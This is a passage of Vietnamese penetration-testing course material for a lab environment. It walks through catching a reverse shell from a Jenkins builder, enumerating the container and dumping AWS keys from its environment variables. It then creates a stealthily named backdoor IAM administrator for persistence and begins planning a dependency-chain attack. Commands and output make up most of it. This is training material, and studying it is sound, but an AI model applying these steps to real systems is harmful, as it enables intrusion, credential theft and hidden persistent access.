Trước khi chúng ta có thể chạy các chỉnh sửa này, chúng ta cần chạy một thứ gì đó để bắt reverse shell. Chúng ta sẽ dùng nc để lắng nghe (-l) trên port 4242 với flag -p. Chúng ta cũng sẽ yêu cầu netcat dùng IPs thay vì DNS resolution (-n), và bật verbose output (-v).

```
kali@cloud-kali:~$ nc -nvlp 4242
listening on [any] 4242 ...
```

                                                              *Listing 30 - Starting Netcat on Kali*

Hãy quay lại chỉnh sửa Jenkinsfile trong SCM server và commit các thay đổi một lần nữa. Điều này sẽ thực thi lại pipeline.

Sau vài giây, chúng ta sẽ nhận được một reverse shell từ builder:

```
kali@cloud-kali:~$ nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.0.1.78] from (UNKNOWN) [198.18.53.73] 54980
bash: cannot set terminal process group (58): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@5e0ed1dc7ffe:~/agent/workspace/image-transform$ whoami
whoami
jenkins
```

                                                         *Listing 33 - Capture Reverse Shell*

Tuyệt vời! Reverse shell của chúng ta từ Jenkins builder đang hoạt động đúng như kỳ vọng.

---

## **5.3. Enumerating the Builder**

---

Bây giờ chúng ta đã leo thang đặc quyền, đã đến lúc liệt kê lại. Hãy bắt đầu bằng việc thu thập thông tin kernel và OS. Chúng ta sẽ lấy thông tin kernel bằng cách chạy **uname** với flag **-a** để hiển thị mọi thứ. Chúng ta cũng sẽ lấy thông tin OS bằng cách xem **/etc/os-release**.

```
jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ uname -a
uname -a
Linux fcd3cc360d9e 4.14.309-231.529.amzn2.x86_64 #1 SMP Tue Mar 14 23:44:59 UTC 2023 x86_64 GNU/Linux

jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"
NAME="Debian GNU/Linux"
VERSION_ID="11"
VERSION="11 (bullseye)"
VERSION_CODENAME=bullseye
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

                                                  *Listing 34 - OS and Kernel information*

Dựa trên output, chúng ta phát hiện rằng chúng ta đang chạy Debian 11 trên một Amazon Linux Kernel. Hãy tiếp tục thu thập thông tin. Working directory của chúng ta nằm ở **~/agent/workspace/image-transform**. Chúng ta sẽ liệt kê nội dung thư mục hiện tại, chuyển nó về thư mục home, và liệt kê cả thư mục home.

```
jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ ls
ls
Jenkinsfile
README.md
image-processor-template.yml
```

                                                       *Listing 35 - Listing Working Directory*

Working directory hiện tại chứa một snapshot của git repo tại thời điểm chúng ta push. Chúng ta đã biết các file này chứa gì, vì vậy hãy chuyển sang thư mục home và liệt kê nội dung của nó.

```
jenkins@fcd3cc360d9e:~/agent/workspace/image-transform$ cd ~

jenkins@fcd3cc360d9e:~$ ls -a
ls -a
.
..
.bash_logout
.bashrc
.cache
.config
.profile
.ssh
agent
```

                                                          *Listing 35 - Listing Home Directory*

Thư mục home chứa một thư mục **.ssh**. Thư mục này có thể chứa SSH private keys. Hãy kiểm tra nó và nội dung các file bên trong.

```
jenkins@fcd3cc360d9e:~$ ls -a .ssh
ls -a
.
..
authorized_keys

jenkins@fcd3cc360d9e:~$ cat .ssh/authorized_keys
cat .ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDP+HH9VS2Oe1djuSNJWhbYaswUC544I0QCp8sSdyTs/yQiytovhTAP/Z1eA2n0OZB2/4/oJn5wpdui8TTnkQGb6KdiLMfO1hZep7QVAY1QAwxLaKz6iEAFUuNxRrctwebVNCVokZr1yQmvlW0qKdQ5RaqU5xu35oDsYhk5vcQj+o8FAhkI5zkA4Mq6UPdLgakxEHaxJT4vWL7rYYvMW8Wz2/ngZS4LlcYmTVRiSRxFs1LdwTwC5DDlL05sqqFGED+Gs6Jy6VFhCZE0oFGZ0EoIMXkjasifVUvf7jPJ/qFKRP47AwJ6zMUUGlwf8t5HFwzK6ZmDoKUiUHg6ZdOEHxHYJRXqQ1IILpgp9g+1+NhYpIwpnvkuurCLFpKby4rRKkECueRUjSMsArKuTdPBZZ1cpC12z/czcGzTib1AjIUaNwobsU5dwVbgPLnDJ6vYVQGTNq5/PLRBeHCluzpaiHFtrP80PL9XomVhCI+lGTKxD9QxYq+mSYyESiEeu7idqw8= jenkins@jenkins
```

                                     *Listing 36 - Checking for Private Keys and Authorized Keys*

Không may, chúng ta không tìm thấy private keys, nhưng chúng ta thấy file **authorized_keys** cho phép một Jenkins ssh key đăng nhập vào user này. Đây hẳn là cách Jenkins controller điều phối các lệnh để thực thi trên builder. Tiếp theo, hãy kiểm tra cấu hình mạng.

```
jenkins@fcd3cc360d9e:~$ ifconfig
ifconfig

bash: ifconfig: command not found

jenkins@fcd3cc360d9e:~$ ip a
ip a
bash: ip: command not found
```

                                              *Listing 37 - Checking Network Configuration*

Cả **ifconfig** và **ip** đều thiếu trên host. Có vẻ chúng ta đang ở trong một container, vì chúng ta bị giới hạn bởi những gì có thể chạy. Liệt kê container rất giống với liệt kê Linux tiêu chuẩn. Tuy nhiên, có một số thứ bổ sung chúng ta nên tìm. Ví dụ, chúng ta nên kiểm tra container xem có mount nào có thể chứa secrets không. Chúng ta có thể liệt kê mounts bằng cách xem nội dung của **/proc/mounts**.

```
jenkins@fcd3cc360d9e:~$ cat /proc/mounts
cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/ZWMYT5LL7SJG7W2C2AQDU3DNZU:/var/lib/docker/overlay2/l/NWVNHZEQTXKQV7TK6L5PBW2LY6:/var/lib/docker/overlay2/l/XQAFTST24ZNNZODESKXRXG2DT3:/var/lib/docker/overlay2/l/XQEBX4RY52MDAKX5AHOFQ33C3J:/var/lib/docker/overlay2/l/RL6A3EXVAAKLS2H3DCFGHT6G4I:/var/lib/docker/overlay2/l/RK5MUYP5EXDS66AROAZDUW4VJZ:/var/lib/docker/overlay2/l/GITV6R24OXBRFWILXTIPQJWAUO:/var/lib/docker/overlay2/l/IJIDXIBWIZUYBIWUF5YWXCOG4L:/var/lib/docker/overlay2/l/6MLZE4Z6A4O4GGDABKH4SEB2ML:/var/lib/docker/overlay2/l/DWFB6EYO3HEPBCCAWYQ4256GNS:/var/lib/docker/overlay2/l/I7JY2SWCL2IPGXKRREITBKE3XF:/var/lib/docker/overlay2/l/U3ULKCXTN7B3QA7WZBNB67UESW,upperdir=/var/lib/docker/overlay2/b01b1c72bc2d688d01493d2aeda69d6a4ec1f6dbb3934b8c1ba00aed3040de4a/diff,workdir=/var/lib/docker/overlay2/b01b1c72bc2d688d01493d2aeda69d6a4ec1f6dbb3934b8c1ba00aed3040de4a/work 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
sysfs /sys sysfs rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cgroup /sys/fs/cgroup/systemd cgroup rw,nosuid,nodev,noexec,relatime,xattr,release_agent=/usr/lib/systemd/systemd-cgroups-agent,name=systemd 0 0
cgroup /sys/fs/cgroup/pids cgroup rw,nosuid,nodev,noexec,relatime,pids 0 0
cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices 0 0
cgroup /sys/fs/cgroup/freezer cgroup rw,nosuid,nodev,noexec,relatime,freezer 0 0
cgroup /sys/fs/cgroup/cpuset cgroup rw,nosuid,nodev,noexec,relatime,cpuset 0 0
cgroup /sys/fs/cgroup/blkio cgroup rw,nosuid,nodev,noexec,relatime,blkio 0 0
cgroup /sys/fs/cgroup/perf_event cgroup rw,nosuid,nodev,noexec,relatime,perf_event 0 0
cgroup /sys/fs/cgroup/hugetlb cgroup rw,nosuid,nodev,noexec,relatime,hugetlb 0 0
cgroup /sys/fs/cgroup/cpu,cpuacct cgroup rw,nosuid,nodev,noexec,relatime,cpu,cpuacct 0 0
cgroup /sys/fs/cgroup/net_cls,net_prio cgroup rw,nosuid,nodev,noexec,relatime,net_cls,net_prio 0 0
cgroup /sys/fs/cgroup/memory cgroup rw,nosuid,nodev,noexec,relatime,memory 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
/dev/xvda1 /run xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /tmp xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /home/jenkins xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /run xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /etc/resolv.conf xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /etc/hostname xfs rw,noatime,attr2,inode64,noquota 0 0
/dev/xvda1 /etc/hosts xfs rw,noatime,attr2,inode64,noquota 0 0
shm /dev/shm tmpfs rw,nosuid,nodev,noexec,relatime,size=65536k 0 0
```

                                                      *Listing 38 - Checking Mounts*

Output xác nhận rằng đây đúng là một Docker container. Tuy nhiên, chúng ta không thấy bất kỳ mount bổ sung nào. Chúng ta cũng nên kiểm tra liệu container này có mang mức đặc quyền cao hay không. Docker containers có thể chạy ở chế độ “privileged”, cấp cho container một lượng lớn quyền trên host. Cấu hình “privileged” cho container bao gồm các Linux capabilities dư thừa, quyền truy cập Linux devices, và nhiều thứ khác. Chúng ta có thể xác định liệu chúng ta đang ở mức quyền cao hơn này hay không bằng cách kiểm tra nội dung của **/proc/1/status** và tìm **Cap** trong output.

```
jenkins@fcd3cc360d9e:~$ cat /proc/1/status | grep Cap
cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

                                           *Listing 39 - Checking Capability for container*

Các giá trị trong **CapPrm**, **CapEff**, và **CapBnd** đại diện cho danh sách capabilities. Tuy nhiên, hiện tại chúng đang được encode, nên chúng ta sẽ phải decode chúng sang dạng hữu ích hơn. Chúng ta có thể làm điều này bằng utility **capsh** của Kali.

```
kali@kali:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

                                                         *Listing 40 - Decoding the capabilities*

Sự hiện diện của **cap_net_admin** và **cap_sys_admin** cho thấy container này đang chạy trong ngữ cảnh privileged, hoặc tối thiểu là được thêm tất cả capabilities. Tuy nhiên, chúng ta đang chạy trong ngữ cảnh của một user không phải root tên là **jenkins**. Để khai thác các capabilities này, trước hết chúng ta sẽ phải tìm một privilege escalation lên root trong container, rồi sau đó khai thác một container escape đặc quyền.

Mặc dù điều này có thể xảy ra, chúng ta cũng biết rằng chúng ta đã thực thi reverse shell của mình với AWS credentials. Hãy tìm các credentials đó trong environment variables. Chúng ta sẽ dùng **env** để liệt kê tất cả environment variables và dùng **grep** để chỉ hiển thị các mục có AWS trong tên.

```
jenkins@fcd3cc360d9e:~$ env | grep AWS
env | grep AWS
AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=REDACTED_AWS_SECRET_ACCESS_KEY
AWS_ACCESS_KEY_ID=REDACTED_AWS_ACCESS_KEY_ID
```

                                                       *Listing 41 - Discovering AWS Keys*

Tuyệt vời! Tiếp theo, hãy thử tìm xem chúng ta có thể làm gì với các credentials này.

---

# 6. Compromise Môi trường thông qua Backdoor Account

---

Các nhà cung cấp public cloud cung cấp khả năng kiểm soát truy cập rất tinh chỉnh bằng các policy phức tạp. Bất cứ khi nào chúng ta phát hiện được credentials, trước hết chúng ta cần xác định mình có thể truy cập gì với chúng. Khi chúng ta xác định được những hành động có thể thực hiện, bước tiếp theo là tạo một administrator account khác làm backdoor, nếu có thể.

Sau khi giành được quyền truy cập ban đầu, chúng ta có thể cần thiết lập persistence trong môi trường. Một kỹ thuật phổ biến trong bối cảnh cloud là tạo một **Backdoor Cloud Account (T1136.003)**, cho phép chúng ta duy trì quyền truy cập theo thời gian bằng cách tận dụng một foothold hợp lệ nhưng kín đáo.

Learning Unit này bao gồm các Learning Objective sau:

- Phát hiện quyền truy cập mà chúng ta có bằng các credentials đã tìm thấy
- Hiểu cách tạo một backdoor user account

---

## 6.1. Khám phá chúng ta có quyền truy cập gì

---

Có nhiều phương pháp mà chúng ta có thể dùng để khám phá permission boundaries của account hiện tại. Cách dễ nhất là dùng account đó để liệt kê thông tin và policies của chính nó, nhưng điều này chỉ hoạt động nếu user có quyền liệt kê quyền truy cập của nó. Một lựa chọn khác là brute force tất cả các API calls và log lại các call thành công. Tuy nhiên, lựa chọn này rất ồn ào, và chúng ta nên tránh khi có thể.

Hãy thử liệt kê policy thủ công trước. Chúng ta có thể bắt đầu bằng việc tạo một AWS profile mới với các credentials mà chúng ta đã phát hiện. Chúng ta sẽ làm điều này bằng lệnh **aws configure**, cung cấp tham số **--profile** với tên **CompromisedJenkins**. Sau đó chúng ta sẽ nhập **Access Key ID** và **Secret Access Key** đã tìm thấy. Tiếp theo, chúng ta sẽ đặt region là **us-east-1**, vì đó là region chúng ta đã gặp cho đến hiện tại. Cuối cùng, chúng ta sẽ để output format ở thiết lập mặc định.

```
kali@kali:~$ aws configure --profile=CompromisedJenkins
AWS Access Key ID [None]: REDACTED_AWS_ACCESS_KEY_ID
AWS Secret Access Key [None]: REDACTED_AWS_SECRET_ACCESS_KEY
Default region name [None]: us-east-1
Default output format [None]: 
```

                                                        *Listing 42 - Configuring a new profile*

Tiếp theo, hãy lấy username. Để làm vậy, chúng ta sẽ chạy subcommand **iam get-user** cho lệnh **aws**. Chúng ta cũng sẽ cần cung cấp tham số **--profile CompromisedJenkins** để đảm bảo chúng ta đang dùng compromised credentials.

```
kali@kali:~$ aws --profile CompromisedJenkins sts get-caller-identity
{
    "UserId": "AIDAUBHUBEGILTF7TFWME",
    "Account": "274737132808",
    "Arn": "arn:aws:iam::274737132808:user/system/jenkins-admin",
}
```

                                                             *Listing 43 - Getting User Name*

Từ output, chúng ta thấy username là **jenkins-admin**. Tiếp theo, hãy khám phá account của chúng ta có những quyền gì. Có ba cách mà một administrator có thể gắn một policy vào một user:

Inline Policy: Policy chỉ tạo cho một user account duy nhất và gắn trực tiếp.

Managed Policy Attached to User: Customer- hoặc AWS-managed policy được gắn vào một hoặc nhiều user.

Group Attached Policy: Inline hoặc Managed Policy được gắn vào một group, group này được gán cho user.

Để xác định permission boundary, chúng ta cần liệt kê cả ba loại policy attachment. Chúng ta sẽ dùng **iam list-user-policies** cho inline policy, **iam list-attached-user-policies** cho managed policy gắn vào user, và **iam list-groups-for-user** để liệt kê các group mà user thuộc về. Với mỗi lệnh, chúng ta cũng sẽ cung cấp tham số **--user-name jenkins-admin** và chọn profile.

```
kali@kali:~$ aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
{
    "PolicyNames": [
        "jenkins-admin-role"
    ]
}

kali@kali:~$ aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
{
    "AttachedPolicies": []
}

kali@kali:~$ aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
{
    "Groups": []
}
```

                                             *Listing 44 - Listing Policies and Group for User*

Dựa trên output, chúng ta thấy user chỉ có một inline policy duy nhất. Tiếp theo, hãy liệt kê policy thực tế để xác định chúng ta có quyền truy cập gì. Chúng ta có thể dùng subcommand **iam get-user-policy** để làm điều này. Chúng ta sẽ chỉ định username và policy name với các tham số **--user-name jenkins-admin** và **--policy-name jenkins-admin-role**.

```
kali@kali:~$ aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
{
    "UserName": "jenkins-admin",
    "PolicyName": "jenkins-admin-role",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "",
                "Effect": "Allow",
                "Action": "*",
                "Resource": "*"
            }
        ]
    }
}
```

                                                                  *Listing 45 - Getting Policy*

Tuyệt vời! Compromised credentials của chúng ta có full administrator access.

---

## 6.2. Tạo một Backdoor Account

---

Tiếp theo, hãy tạo một backdoor account thay vì sử dụng account **jenkins-admin**. Trong khi vẫn chỉ định Jenkins credentials (**--profile CompromisedJenkins**), chúng ta sẽ chạy subcommand **iam create-user** và truyền vào username với **--user-name backdoor**.

<aside>
💡

Trong ví dụ này, chúng ta đặt username là **backdoor**. Tuy nhiên, trong một engagement thực tế, chúng ta sẽ chọn một username kín đáo hơn, chẳng hạn như **terraform-admin**.

</aside>

```
kali@kali:~$ aws --profile CompromisedJenkins iam create-user --user-name backdoor                                  
{
    "User": {
        "Path": "/",
        "UserName": "backdoor",
        "UserId": "AIDAUBHUBEGIPX2SBIHLB",
        "Arn": "arn:aws:iam::274737132808:user/backdoor",
    }
}
```

                                                                    *Listing 46 - Create User*

Tiếp theo, chúng ta sẽ gắn AWS managed policy **AdministratorAccess**. Chúng ta sẽ làm điều này bằng cách dùng subcommand **iam attach-user-policy**, cung cấp username với **--user-name**. Chúng ta cũng sẽ chỉ định ARN của policy **AdministratorAccess** bằng tham số **--policy-arn arn:aws:iam::aws:policy/AdministratorAccess**.

```bash
kali@kali:~$ aws --profile CompromisedJenkins iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

kali@kali:~$ 
```

                                                               *Listing 47 - Attach Admin Policy*

Tiếp theo, chúng ta cần tạo **access key** và **secret key** cho user. Chúng ta sẽ dùng subcommand **iam create-access-key**.

```
kali@kali:~$ aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
{
    "AccessKey": {
        "UserName": "backdoor",
        "AccessKeyId": "REDACTED_AWS_ACCESS_KEY_ID",
        "Status": "Active",
        "SecretAccessKey": "REDACTED_AWS_SECRET_ACCESS_KEY",
    }
}
```

                                                             *Listing 48 - Create Access Key*

Cuối cùng, chúng ta sẽ cấu hình một profile mới trong AWS CLI với các credentials vừa thu được. Chúng ta sẽ xác nhận mọi thứ hoạt động bằng cách liệt kê các user policies đã được gắn bằng subcommand **iam list-attached-user-policies**.

```
kali@kali:~$ aws configure --profile=backdoor                                           
AWS Access Key ID [None]: REDACTED_AWS_ACCESS_KEY_ID
AWS Secret Access Key [None]: REDACTED_AWS_SECRET_ACCESS_KEY
Default region name [None]: us-east-1
Default output format [None]:  

kali@kali:~$ aws --profile backdoor iam list-attached-user-policies --user-name backdoor
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

                                                    *Listing 49 - Configure profile and list policies*

Tuyệt vời! Bây giờ chúng ta đã có một backdoor account.

Để kết thúc, cần nhấn mạnh kết quả cuối cùng của quá trình này: kẻ tấn công giành được toàn quyền quản trị trong account mục tiêu, cùng với một backdoor user có thể được sử dụng để duy trì quyền truy cập dài hạn. Mức độ kiểm soát này cho phép việc khai thác liên tục và persistence trong môi trường đã bị compromise. Trong các Learning Unit tiếp theo, chúng ta sẽ khám phá một kỹ thuật tấn công AWS khác, tập trung vào **dependency chain abuse**, giới thiệu một vector khác để giành quyền kiểm soát các tài nguyên cloud.

---

# 7. Lạm dụng Dependency Chain

---

Dependency Chain Abuse xảy ra khi một tác nhân độc hại đánh lừa hệ thống build tải xuống mã độc hại bằng cách chiếm quyền hoặc giả mạo các dependency. **Insufficient Pipeline-Based Access Controls** xảy ra khi các pipeline có quyền quá mức, làm tăng nguy cơ hệ thống bị compromise. Các quyền này cần được giới hạn chặt chẽ để ngăn chặn rủi ro. **Insecure System Configuration** đề cập đến các lỗ hổng do cấu hình sai hoặc code không an toàn, trong khi **Improper Artifact Integrity Validation** cho phép kẻ tấn công đẩy mã độc vào pipeline mà không có các kiểm tra phù hợp. Các rủi ro OWASP này thường chồng chéo nhau và đóng vai trò như những hướng dẫn chung.

Trong nửa sau của module, chúng ta sẽ khai thác thông tin công khai về một dependency bị thiếu, phát hành một package độc hại và khiến nó được thực thi trong môi trường production. Khi đã xâm nhập, chúng ta sẽ quét mạng, tunnel vào automation server, khai thác một lỗ hổng plugin để lấy AWS keys, và cuối cùng tìm thấy một Terraform state file chứa admin AWS keys.

Khi đã có quyền truy cập vào production, chúng ta sẽ quét mạng nội bộ và phát hiện thêm một số dịch vụ. Từ đó, chúng ta sẽ tunnel vào automation server, nơi chúng ta có thể tạo một account và khai thác một lỗ hổng trong plugin đã cài để lấy AWS access keys. Sử dụng các access keys đó, chúng ta sẽ tiếp tục liệt kê cho đến khi tìm thấy một S3 bucket, trong đó chứa một Terraform state file với administrator AWS keys.

Chúng ta sẽ bao gồm các Learning Unit sau:

- Lab Design
- Information Gathering
- Dependency Chain Attack
- Compromising the Environment
- Wrapping Up

---

## 7.1. Truy cập Labs

---

Ở cuối phần này, chúng ta sẽ có thể bắt đầu lab. Điều này cung cấp cho chúng ta:

- Địa chỉ IP của DNS server
- Địa chỉ IP của Kali
- Mật khẩu Kali

Để truy cập các dịch vụ, chúng ta cần cấu hình máy Kali cá nhân (không phải cloud instance) sử dụng DNS server được cung cấp và pip client. Hãy bắt đầu với DNS server. Trong ví dụ này, DNS server của chúng ta được host tại **203.0.113.84**.

Chúng ta sẽ bắt đầu bằng cách liệt kê các kết nối đang hoạt động trên máy Kali bằng **nmcli** với subcommand **connection**. Tùy thuộc vào cách Kali được kết nối (Wi-Fi, VM, v.v.), output có thể khác nhau.

```
kali@kali:~$ nmcli connection
NAME                UUID                                  TYPE      DEVICE 
Wired connection 1  67f8ac63-7383-4dfd-ae42-262991b260d7  ethernet  eth0   
lo                  1284e5c4-6819-4896-8ad4-edeae32c64ce  loopback  lo 
```

              *Listing 1 - Liệt kê tất cả các kết nối mạng đang hoạt động trên máy Kali của chúng ta*

Kết nối mạng chính của chúng ta có tên là **"Wired connection 1"**. Chúng ta sẽ dùng nó trong lệnh tiếp theo để thiết lập cấu hình DNS. Sau đó, chúng ta sẽ thêm subcommand **modify** cho nmcli và chỉ định tên kết nối mà chúng ta muốn chỉnh sửa. Hãy đặt **ipv4.dns** thành IP của DNS server. Sau khi thiết lập xong, chúng ta sẽ dùng **systemctl** để restart service **NetworkManager**.

```
kali@kali:~$ nmcli connection modify "Wired connection 1" ipv4.dns "203.0.113.84"

kali@kali:~$ sudo systemctl restart NetworkManager
```

        *Listing 2 - Thiết lập cấu hình DNS server cho ipv4.dns và restart service NetworkManager*

DNS server được host này chỉ phản hồi cho domain **offseclab.io**. Bạn có thể chỉ định thêm các DNS server khác như **1.1.1.1** hoặc **8.8.8.8** bằng cách thêm chúng vào danh sách phân tách bằng dấu phẩy trong lệnh trên; ví dụ:

`"203.0.113.84, 1.1.1.1, 8.8.8.8"`.

Sau khi cấu hình, chúng ta có thể xác nhận rằng thay đổi đã được áp dụng bằng cách kiểm tra IP DNS trong file **/etc/resolv.conf**. Chúng ta cũng sẽ dùng **nslookup** để kiểm tra xem DNS server có phản hồi các truy vấn phù hợp hay không.

```
kali@kali:~$ cat /etc/resolv.conf
# Generated by NetworkManager
search localdomain
nameserver 203.0.113.84
...

kali@kali:~$ nslookup git.offseclab.io
Server:         203.0.113.84
Address:        203.0.113.84#53

Non-authoritative answer:
Name:   git.offseclab.io
Address: 198.18.53.73
```

*Listing 3 - Xác minh thay đổi DNS và kiểm tra phản hồi của DNS server đối với các truy vấn của chúng ta*

Chúng ta đã ghi các thay đổi vào file **resolv.conf** và truy vấn thành công một DNS entry.

Mỗi lần restart lab sẽ cung cấp cho chúng ta một DNS IP mới, và chúng ta sẽ cần chạy lại các lệnh trên để thiết lập. Vì DNS server sẽ bị hủy khi lab kết thúc, chúng ta sẽ cần xóa entry này khỏi cấu hình bằng cách chạy lệnh **nmcli** trong Listing 2 với một chuỗi rỗng thay vì IP. Chúng ta sẽ minh họa điều này trong phần **Wrapping Up**.

Tiếp theo, hãy cấu hình pip client trên Kali instance của chúng ta. Để sử dụng cloud Kali instance cho các lệnh pip, chúng ta cũng sẽ cần thực hiện các cập nhật này ở đó.

Chúng ta có thể cấu hình pip bằng file **~/.config/pip/pip.conf**. Trước hết, chúng ta sẽ tạo thư mục **~/.config/pip/** bằng **mkdir** với tùy chọn **-p**, tùy chọn này sẽ tạo cả các thư mục trung gian (**.config** và **pip**). Tiếp theo, chúng ta sẽ dùng **nano** để tạo và chỉnh sửa file **pip.conf**.

```
kali@kali:~$ mkdir -p ~/.config/pip/      

kali@kali:~$ nano ~/.config/pip/pip.conf

kali@kali:~$ cat -n  ~/.config/pip/pip.conf
1  [global]
2  index-url = http://pypi.offseclab.io
3  trusted-host = pypi.offseclab.io     
```

                                             *Listing 50 - Cấu hình pip và tạo file pip.conf*

Ở dòng 1, chúng ta chỉ định cấu hình **global** cấp cao nhất để đảm bảo nó được áp dụng mỗi khi user sử dụng pip. Tiếp theo, chúng ta chỉ định server [**http://pypi.offseclab.io**](http://pypi.offseclab.io/), đây là bản thay thế của chúng ta cho server PyPI chính thức. Cuối cùng, chúng ta cần chỉ định đây là một **trusted-host** vì nó sử dụng HTTP thay vì HTTPS.

---

# **8. Information Gathering**

---

Giống như mọi đánh giá bảo mật khác, chúng ta nên bắt đầu bằng việc thu thập càng nhiều thông tin càng tốt về môi trường mục tiêu. Việc thu thập thông tin này là then chốt để có thể khai thác một ứng dụng một cách đúng đắn.

Learning Unit này bao gồm các Learning Objective sau:

- Liệt kê các ứng dụng mục tiêu
- Thực hiện thu thập thông tin open-source về tổ chức

---

## **8.1. Enumerating the Services**

---

Hãy bắt đầu bằng cách truy cập ứng dụng mục tiêu (**app.offseclab.io**) và tìm hiểu cách nó hoạt động.

![image.png](image%2015.png)

                                                          *Hình 16: Truy cập ứng dụng mục tiêu*

Tên của ứng dụng mục tiêu là **HackShort** và, dựa trên mô tả, nó có thể rút gọn các URL dài thành các URL ngắn hơn. Chúng ta cũng tìm thấy một liên kết (**HackShort’s API**) dẫn tới tài liệu API của ứng dụng.

![image.png](image%2016.png)

                                                        *Hình 17: Tài liệu API của HackShort*

Bước đầu tiên cho biết chúng ta cần tạo một access token để sử dụng API. Hãy theo liên kết đó.

![image.png](image%2017.png)

                                                                        *Hình 18: Trình tạo Token*

Chúng ta sẽ nhập một địa chỉ email ngẫu nhiên và nhấp **Get API Key**.

![image.png](image%2018.png)

                                                                  *Hình 19: Token được tạo*

Thao tác này đưa chúng ta tới một trang chứa API token của mình.

Trong một đánh giá truyền thống, việc phát hiện tài liệu API và lấy được một API token sẽ làm mở rộng đáng kể bề mặt tấn công của chúng ta. Tuy nhiên, vì chúng ta đang nhắm vào pipeline chứ không phải ứng dụng, chúng ta sẽ tiếp tục quá trình liệt kê. Cần lưu ý rằng thông thường chúng ta sẽ dành nhiều thời gian hơn để tấn công ứng dụng bằng một công cụ như **Burp**.

Thay vào đó, hãy tiếp tục liệt kê ứng dụng để phát hiện thêm thông tin. Chúng ta sẽ mở **Developer Tools** trong Firefox bằng cách nhấp chuột phải vào bất kỳ đâu trên trang và chọn **Inspect (Q)**. Sau đó, chúng ta có thể chuyển sang tab **Network**, refresh trang, và kiểm tra request và response đầu tiên.

![image.png](image%2019.png)

                                                  *Hình 20: Tab Network trong Developer Tools*

Một điểm nổi bật đối với chúng ta là các **Server headers**. Chúng ta sẽ nhận thấy có hai header với giá trị **Caddy**. Điều này cho thấy ứng dụng rất có thể đang nằm phía sau hai Caddy reverse proxies. Tuy nhiên, chúng ta cũng tìm thấy một Server header với giá trị **Werkzeug/1.0.1 Python/3.11.2**. Điều này cho chúng ta biết rằng ứng dụng mục tiêu rất có thể được viết bằng **Python**.

---

## 8.2. Thực hiện Open Source Intelligence

---

Trong khi việc liệt kê ứng dụng và pipeline là quan trọng, việc tìm kiếm trên Internet công khai cho bất kỳ thông tin nào có thể liên quan đến mục tiêu cũng quan trọng không kém. Điều này có thể bao gồm việc tìm kiếm tên mục tiêu trên các website như Stack Overflow, Reddit và các diễn đàn khác. Trong một số trường hợp, điều này có thể không khả thi do số lượng kết quả trùng khớp tiềm năng quá lớn. Tuy nhiên, khi mục tiêu không phải là một công cụ công khai phổ biến, việc này có thể mang lại nhiều giá trị.

Hãy giả sử rằng chúng ta đã thực hiện tìm kiếm từ khóa **“hackshort”** trên một diễn đàn và phát hiện bài viết sau:

![image.png](image%2020.png)

                                                       *Hình 21: Bài viết diễn đàn về Hackshort*

Người dùng đang phàn nàn rằng họ không thể build container image và đang yêu cầu trợ giúp. Tuy nhiên, họ đã để lộ một số thông tin then chốt trong bài viết này, có thể cho phép chúng ta giành được quyền thực thi mã trên các developer workstations của họ hoặc trong các môi trường khác nhau. Cụ thể, chúng ta phát hiện rằng có một Python module tên là **hackshort-util**.

Hãy kiểm tra public repository và thử xác định xem utility này có được công khai hay không. Nếu có, chúng ta sẽ có cái nhìn sơ bộ về source code nội bộ. Nếu không có, chúng ta có thể tiến hành một cuộc tấn công dependency chain.

